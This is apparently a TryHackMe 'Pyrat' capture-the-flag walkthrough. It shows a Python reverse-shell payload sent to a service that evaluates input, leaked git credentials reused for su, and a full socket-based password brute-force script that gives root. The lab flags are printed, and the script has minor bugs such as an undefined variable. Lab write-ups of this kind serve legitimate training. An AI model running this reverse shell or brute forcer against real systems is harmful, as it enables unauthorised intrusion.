
# TryHackMe: Pyrat – User Flag Walkthrough

##  Initial Enumeration

After discovering port `8000` open alongside SSH (`22`) during an Nmap scan, the HTTP service responded oddly:

```
Try a more basic connection
```

This hinted that the service might interpret raw TCP input. Connecting with `nc`:

```bash
nc pyrat.thm 8000
```

Sending standard HTTP requests caused Python syntax errors (`name 'GET' is not defined`), suggesting the server was evaluating input as Python code.

I tried inputting: print("hello") to confirm this vulnerability

## Gaining a Shell

Using this vulnerability, I sent a reverse shell payload through the raw TCP connection:

---

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.85.160",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])
```

---

With a listener running:

```bash
rlwrap nc -lvnp 4444
```

I gained a shell as the `www-data` user.

I wanted a real shell so i ran:

'''bash
python3 'import pty; pty.spawn("/bin/bash")'

## Privilege Escalation – Git Credentials

While exploring the file system, I found a Git repository in `/opt/dev/.git/`. Inside `config`, I discovered hardcoded credentials:

```bash
cat /opt/dev/.git/config
```

```ini
[credential "https://github.com"]
	username = think
	password = _TH1NKINGPirate$_
```

I used this password to switch to the `think` user:

```bash
su think
Password: _TH1NKINGPirate$_
```

## User Flag

Now as the `think` user, I accessed the home directory and retrieved the user flag:

```bash
cd ~
cat user.txt
```

```
996bdb1f619a68361417cabca5454705
```

---

✅ User flag successfully captured!


# Now for the root flag


## Overview

The target machine hosts an HTTP service on port `8000`, which exhibits a prompt-based interface for authentication. A careful analysis revealed the possibility of brute-forcing credentials. After successful login, shell access was achieved, ultimately leading to privilege escalation and the retrieval of the root flag.

---

## Steps Taken

### 1. **Service Enumeration**

Connecting to the service using `nc`:

```bash
nc 10.10.102.10 8000
```

Prompt:
```
admin
Password:
```

---

### 2. **Brute Forcing Passwords**

A custom Python script was created to fuzz passwords for the user `admin`, using a small wordlist (`rockyou-75.txt`)

**Script Summary:**

- Sends `admin` as username.
- Iterates through wordlist sending each password.
- Detects a successful login by change in response content.

```bash
python3 script.py
```

Output indicating success:
```
Password: abc123
  Prompt: Password:
  Response: Welcome Admin!!! Type "shell" to begin
[+] Potential success with password: abc123
```

---

### 3. **Manual Login**

With the discovered credentials:

```bash
nc 10.10.102.10 8000
```

```
Username: admin
Password: abc123
Welcome Admin!!! Type "shell" to begin
```

Typing `shell` drops into a shell:
```bash
# whoami
root
```

---

### 4. **Flag Retrieval**

Listing files:
```bash
ls
pyrat.py  root.txt  snap
```

Reading the flag:
```bash
cat root.txt
ba5ed03e9e74bb98054438480165e221
```

---

## Outcome

Full root access was achieved via brute-forcing credentials and exploiting the exposed shell interface. The machine's weakness was its reliance on simple password authentication with no lockout mechanism.

---

## Tools Used

- `nc`
- Python 3
- Custom script with socket library
- `rockyou-75.txt` (subset of common leaked passwords)

---

## Solve script:


```import socket
import time
import sys

# Configuration
HOST = "10.10.102.10"
PORT = 8000
WORDLIST = "/home/marv1nh/SecLists/Passwords/Leaked-Databases/rockyou-75.txt"
TIMEOUT = 5  # Seconds for socket timeout
DELAY = 1.0  # Seconds between attempts
RECV_BUFFER = 4096  # Bytes to receive

def load_wordlist():
    """Load passwords from rockyou-75.txt and add extra password."""
    try:
        with open(WORDLIST, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
        if len(passwords) > 100000000000:  # Allow slight variation from 75
            print(f"[-] Error: Wordlist has {len(passwords)} entries, expected ~75 for rockyou-75.txt")
            print("[-] Likely using rockyou.txt or incorrect file. Please use the correct rockyou-75.txt.")
            sys.exit(1)
        passwords.append(EXTRA_PASSWORD)
        return passwords
    except FileNotFoundError:
        print(f"[-] Error: Wordlist not found at {WORDLIST}")
        print("[-] Please ensure SecLists is installed or provide the correct path.")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error loading wordlist: {e}")
        sys.exit(1)

def try_password(password):
    """Send 'admin' and password, check for Password: prompt and response."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(TIMEOUT)
        try:
            s.connect((HOST, PORT))
            # Send 'admin'
            s.sendall(b"admin\n")
            time.sleep(0.2)  # Wait for prompt
            # Receive prompt
            prompt = s.recv(RECV_BUFFER).decode(errors="ignore").strip()
            if "Password:" not in prompt:
                return prompt, "Unexpected prompt"
            # Send password
            s.sendall(f"{password}\n".encode())
            # Receive response
            response = s.recv(RECV_BUFFER).decode(errors="ignore").strip()
            return prompt, response
        except socket.timeout:
            return "", "Timeout"
        except ConnectionResetError:
            return "", "Connection reset"
        except Exception as e:
            return "", f"Error: {e}"

def main():
    print(f"[*] Starting password fuzzing against {HOST}:{PORT}")
    print(f"[*] Using wordlist: {WORDLIST}")
    passwords = load_wordlist()
    print(f"[*] Loaded {len(passwords)} passwords (including extra password)")

    for password in passwords:
        prompt, response = try_password(password)
        print(f"Password: {password}")
        print(f"  Prompt: {prompt or 'None'}")
        print(f"  Response: {response}")
        # Success if response is not 'Password:' or an error
        if response and response != "Password:" and "Timeout" not in response and "Error" not in response and "Connection reset" not in response:
            print(f"[+] Potential success with password: {password}")
            print(f"[+] Response: {response}")
            input("[*] Press Enter to continue...")
        time.sleep(DELAY)

if __name__ == "__main__":
    main()
```
